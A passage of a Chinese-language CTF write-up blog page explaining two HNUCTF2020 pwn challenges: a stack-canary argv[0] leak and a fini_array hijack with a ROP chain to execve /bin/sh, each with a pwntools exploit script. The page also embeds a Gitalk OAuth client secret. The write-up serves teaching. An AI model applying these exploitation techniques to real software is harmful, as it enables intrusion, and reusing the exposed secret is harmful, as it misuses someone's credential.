class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="2-overflow">2. overflow</h2>
+<p>点击 <a href="/2020/02/HNUCTF2020-pwn/pwn4.zip" title="这里">这里</a> 下载题目</p>
+<h3 id="易知信息-2">易知信息</h3>
+<ul>
+<li>
+<p>开启 NX 保护，堆栈不可执行</p>
+</li>
+<li>
+<p>开启 <code>Canary</code> 保护，不可直接栈溢出</p>
+</li>
+<li>
+<p>存在栈溢出漏洞</p>
+</li>
+<li>
+<p>.data 段有 <code>flag</code></p>
+  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>0000000000600D20 <span class="comment">; char byte_600D20[]</span></span><br><span class="line"><span class="symbol">.data:</span>0000000000600D20 byte_600D20     <span class="built_in">db</span> <span class="string">'P'</span>                  <span class="comment">; DATA XREF: vul_func+6E</span></span><br><span class="line"><span class="symbol">.data:</span>0000000000600D21 aCtfHereSTheFla <span class="built_in">db</span> <span class="string">'CTF&#123;Here'</span>,<span class="number">27h</span>,<span class="string">'s the flag on server&#125;'</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>下载下来的 ELF 文件里的 <code>flag</code> 不是真正的 <code>flag</code> ，但服务器上的 ELF 文件里的 <code>flag</code> 是真的<br>
+只要能在本地将假 <code>flag</code> 成功泄露，那么服务器端的 <code>flag</code> 就同样可以泄露成功</li>
+</ul>
+</li>
+<li>
+<p>漏洞函数 <code>vul_func</code> 会将第二次输入的数据直接覆盖在 <code>.data</code> 段 <code>flag</code> 字符串上（ <code>flag</code> 地址： <code>0x600D20</code> ），倘若输入的字符串长度没有满 32 字节，那么 <code>memset</code> 就会“帮”我们销毁 <code>flag</code></p>
+<blockquote>
+<p>总而言之，<code>.data</code> 段上的 <code>flag</code> 一定会被销毁</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="分析-2">分析</h3>
+<ul>
+<li>
+<p>ELF 文件在加载进内存时会先映射到内存上的某一块区域，然后再进行段到段的映射</p>
+<ul>
+<li>换句话说，在虚拟内存中存在一份 ELF 文件拷贝，此拷贝中存在 <code>flag</code> 字符串</li>
+</ul>
+</li>
+<li>
+<p>当函数返回时，如果栈上的 <code>Canary</code> 值与 <code>fs:[0x28]</code>上的值不符时，会直接执行<code>___stack_chk_fail</code> 函数，不会 leave_ret。而此函数 glibc 源代码如下：</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//eglibc-2.19/debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function  __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>__libc_argv[0]</code> 是一个默认指向存放着当前程序名称的指针</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="解决方案-2">解决方案</h3>
+<ul>
+<li>
+<p>只要劫持<code>__libc_argv[0]</code>为我们想输出的地址，那就可以通过<code>___stack_chk_fail</code> 函数显示出来</p>
+</li>
+<li>
+<p>思路已经很明确了，劫持 <code>___stack_chk_fail</code> 函数，显示 <code>flag</code> 拷贝的内容</p>
+</li>
+</ul>
+<h4 id="EXP-2">EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"xx.xx.xx.xx"</span>, <span class="number">8016</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一份flag拷贝的内存地址</span></span><br><span class="line">flag_addr = <span class="number">0x00400D20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖__libc_argv[0]，并间接调用___stack_chk_fail函数</span></span><br><span class="line">payload1 = <span class="number">0x44</span> * p64(flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">"Hello!\nWhat's your name? "</span>, payload1)</span><br><span class="line">io.sendlineafter(<span class="string">"Please  give  me the flag: "</span>, <span class="string">"orz\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="感想">感想</h3>
+<ul>
+<li>谁知道真假 <code>flag</code> 竟然是同一个，当初得到服务器端的 <code>flag</code> 后犹豫了好久，还以为自己做错了。果然最危险的地方就是最安全的地方 XD</li>
+</ul>
+<hr>
+<h2 id="3-shellcode">3. shellcode</h2>
+<p>点击 <a href="/2020/02/HNUCTF2020-pwn/pwn5.zip" title="这里">这里</a> 下载题目</p>
+<h3 id="易知信息-3">易知信息</h3>
+<ul>
+<li>开启<code>NX</code>保护</li>
+<li><code>静态编译</code></li>
+<li><code>main</code>函数中允许任意地址写入<code>24Bytes</code></li>
+<li><code>byte_4B9330</code>存在<code>8bit</code>整数溢出漏洞</li>
+</ul>
+<h3 id="分析-3">分析</h3>
+<ul>
+<li>
+<p>主函数在任意写之后，必然会执行<code>_libc_csu_fini</code>。其中，还会执行<code>fini_array</code>上指针指向的函数。所以我们可以通过一次性修改<code>fini_array</code>上的<code>两个</code>函数地址，从而无限次<code>ret2main</code>，进而通过<code>整数溢出漏洞</code>进行无限次任意写。即作如下修改：</p>
+<blockquote>
+<p>正常的执行路径：<code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>_fini_array[1]</code> -&gt; <code>fini_array[0]</code>  -&gt; <code>_libc_csu_fini</code><br>
+无限写的执行路径：<code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>...</code><br>
+栈劫持的执行路径：<code>...</code> -&gt; <code>main</code> -&gt; <code>leave_ret</code> -&gt; <code>ROP</code> -&gt; <code>shell</code></p>
+</blockquote>
+</li>
+<li>
+<p>该程序为静态链接, <code>_libc_csu_fini</code> 会将 <code>rbp</code> 置为 <code>&amp;fini_array[0]</code> ,故可以通过<code>main</code>函数里的任意写，修改<code>fini_array[0]</code>为<code>leave_ret</code>指令的地址， 就可在<code>leave_ret</code>返回时劫持<code>rsp</code>到<code>&amp;fini_array[0]</code>，进而劫持<code>rip</code>。</p>
+<ul>
+<li>注意，这点的实现前提是该程序为<code>静态链接</code>，因为<code>静态链接</code>和<code>动态链接</code>的<code>_libc_csu_fini</code>的实现是不一样的
+<ul>
+<li>
+<p>静态链接的 <code>_libc_csu_fini</code></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; _libc_csu_fini by static linked</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402960</span> sub_402960      proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402960</span>                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402961</span>                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, unk_4B4100</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402968</span>                 <span class="keyword">lea</span>     <span class="built_in">rbp</span>, off_4B40F0 <span class="comment">; the address of fini_array</span></span><br><span class="line"><span class="symbol">.text:</span>040296F                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402970</span>                 <span class="keyword">sub</span>     <span class="built_in">rax</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402973</span>                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402977</span>                 <span class="keyword">sar</span>     <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>040297B                 <span class="keyword">jz</span>      short loc_402996</span><br><span class="line"><span class="symbol">.text:</span><span class="number">040297D</span>                 <span class="keyword">lea</span>     <span class="built_in">rbx</span>, [<span class="built_in">rax</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402981</span>                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402988</span> loc_402988:</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402988</span>                 <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+<span class="built_in">rbx</span>*<span class="number">8</span>+<span class="number">0</span>] <span class="comment">; call the func_ptrs in fini_array</span></span><br><span class="line"><span class="symbol">.text:</span>040298C                 <span class="keyword">sub</span>     <span class="built_in">rbx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402990</span>                 <span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="number">0FFFFFFFFFFFFFFFFh</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402994</span>                 <span class="keyword">jnz</span>     short loc_402988</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402996</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402996</span> loc_402996:</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402996</span>                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>040299A                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>040299B                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>040299C                 <span class="keyword">jmp</span>     _term_proc</span><br><span class="line"><span class="symbol">.text:</span>040299C sub_402960      endp</span><br><span class="line"></span><br><span class="line"><span class="symbol">.fini:</span>048E32C _term_proc      proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.fini:</span>048E32C                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.fini:</span>048E330                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.fini:</span>048E334                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.fini:</span>048E334 _term_proc      endp</span><br></pre></td></tr></table></figure>
+<ul>
+<li>动态链接的 <code>_libc_csu_fini</code></li>
+</ul>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; _libc_csu_fini by dynamic linked</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span> <span class="comment">; void fini(void)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span> fini            proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span>                 <span class="keyword">rep</span> <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span> fini            endp</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>通过任意写，我们可以在<code>fini_array</code>中构造ROP链，从而<code>get shell</code>。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 刚好这五个ROPgadget在程序中都存在 XD</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rax</span>   <span class="keyword">ret</span>    <span class="comment">; 0x3b</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span>   <span class="keyword">ret</span><span class="comment">;   ; the address of "/bin/sh"</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rsi</span>   <span class="keyword">ret</span><span class="comment">;   ; 0  </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rdx</span>   <span class="keyword">ret</span><span class="comment">;   ; 0</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="解决方案-3">解决方案</h3>
+<ol>
+<li>修改 <code>fini_array[1]</code>上的地址为<code>main</code>、 <code>fini_array[0]</code>上的地址为<code>_libc_csu_fini</code></li>
+<li>在<code>fini_array</code>上构建<code>除了第一条ROP</code>的剩余ROP链</li>
+<li>将<code>fini_array[0]</code>修改为<code>leave_ret</code>指令的地址、将<code>fini_array[1]</code>修改为<code>第一条ROP指令</code>的地址，从而将ROP链连接起来</li>
+<li>待<code>leave_ret</code> 返回，劫持<code>rip</code>, 最后通过ROP链 <code>get shell</code>。</li>
+</ol>
+<blockquote>
+<p>构建ROP链时需注意：<code>leave_ret</code>指令，会使<code>rsp</code>在<code>ret</code>时指向<code>fini_array[1]</code>，所以必须在最后一次执行<code>main</code>函数时同时修改<code>fini_array[0]</code>为<code>leave_ret</code>、修改<code>fini_array[1]</code>为<code>第一条ROP指令</code>的地址，从而补全ROP链<br>
+为什么<code>在ret时rsp会指向fini_array[1]</code>呢？看完下面那个表格就知道了</p>
+</blockquote>
+<blockquote>
+<p>|       | <code>-&gt;</code>  <code>mov rsp rbp</code>  | <code>mov rsp rbp</code>  |     <code>mov rsp rbp</code> |<br>
+|       |           <code>pop rbp</code>  | <code>-&gt;</code> <code>pop rbp</code> |         <code>pop rbp</code> |</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:right"></th>
+<th style="text-align:right"><code>ret</code></th>
+<th style="text-align:right"><code>ret</code></th>
+<th style="text-align:right"><code>-&gt;</code> <code>ret</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:right"><code>rbp</code></td>
+<td style="text-align:right">&amp;fini_array[0]</td>
+<td style="text-align:right">&amp;fini_array[0]</td>
+<td style="text-align:right">fini_array[0]</td>
+</tr>
+<tr>
+<td style="text-align:right"><code>rsp</code></td>
+<td style="text-align:right">point to stack</td>
+<td style="text-align:right">&amp;fini_array[0]</td>
+<td style="text-align:right"><code>&amp;fini_array[1]</code></td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h4 id="EXP-3">EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"xx.xx.94.176"</span>, <span class="number">8011</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">pop_rax_addr = <span class="number">0x000000000041e4af</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx_addr = <span class="number">0x0000000000446e35</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004022b4</span></span><br><span class="line">leave_ret_addr = <span class="number">0x0000000000401c4b</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401B6D</span></span><br><span class="line">_libc_csu_fini_addr = <span class="number">0x0000000000402960</span></span><br><span class="line">fini_array_addr = <span class="number">0x00000000004B40F0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(address, data)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">"addr:"</span>, str(address))</span><br><span class="line">    io.sendafter(<span class="string">"data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改程序执行逻辑</span></span><br><span class="line">write(fini_array_addr, flat(_libc_csu_fini_addr, main_addr))</span><br><span class="line"><span class="comment"># 构建ROP链</span></span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">3</span>, flat(pop_rdi_addr, fini_array_addr+<span class="number">8</span>*<span class="number">10</span>))</span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">5</span>, flat(pop_rsi_addr, <span class="number">0</span>))</span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">7</span>, flat(pop_rdx_addr, <span class="number">0</span>))</span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">9</span>, flat(syscall_addr, <span class="string">"/bin/sh\x00"</span>))</span><br><span class="line"><span class="comment"># 栈劫持并执行ROP，得到shell</span></span><br><span class="line">write(fini_array_addr, flat(leave_ret_addr, pop_rax_addr, <span class="number">0x3b</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="随笔">随笔</h3>
+<ul>
+<li>这题当初没做出来，复盘时才知道考点是静态链接中 <code>_libc_csu_fini</code> 和 <code>fini_array</code> 的利用</li>
+<li>在复盘时，我寻求了大佬的帮助，同时也大量参考了Freebuf里的一篇关于<code>_libc_csu_fini</code> 和 <code>fini_array</code>的利用，不得不说真是收益良多。</li>
+<li>复盘时大佬的指点也让我豁然开朗，特此感谢协会大佬的鼓励与支持</li>
+<li>原题为<a href="pwnable.tw">pwnable.tw</a> 的 <code>3x17</code></li>
+</ul>
+<h3 id="参考">参考</h3>
+<blockquote>
+<p><a href="https://www.freebuf.com/articles/system/226003.html" target="_blank" rel="noopener">详解64位静态编译程序的fini_array劫持及ROP攻击</a><br>
+<a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">Linux Syscall Reference</a></p>
+</blockquote>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/02/HNUCTF2020-pwn/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/03/pwnable.tw/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            pwnable.tw 部分题解
+          
+        </div>
+      </a>
+    
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
